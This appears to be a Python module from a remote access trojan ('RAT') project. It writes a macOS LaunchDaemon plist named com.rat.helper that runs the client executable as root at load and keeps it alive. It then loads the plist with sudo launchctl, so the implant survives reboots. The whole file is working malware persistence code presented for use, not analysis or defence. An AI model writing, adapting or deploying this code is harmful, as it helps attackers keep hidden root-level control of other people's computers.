import subprocess

from core.utils.client_util import get_executable_path


def create_launchdaemon(script_path):
    plist = {
        'Label': 'com.rat.helper',
        'ProgramArguments': ['/bin/sh', '-c', script_path],
        'RunAtLoad': True,
        'KeepAlive': True,
        'StandardOutPath': '/tmp/rat.out',
        'StandardErrorPath': '/tmp/rat.err',
        'UserName': 'root'
    }

    plist_path = '/Library/LaunchDaemons/com.rat.helper.plist'
    with open(plist_path, 'wb') as f:
        import plistlib
        plistlib.dump(plist, f)

    # 加载服务
    subprocess.run(['sudo', 'launchctl', 'load', plist_path])
    print(f'Daemon created: {plist_path}')


create_launchdaemon(get_executable_path())
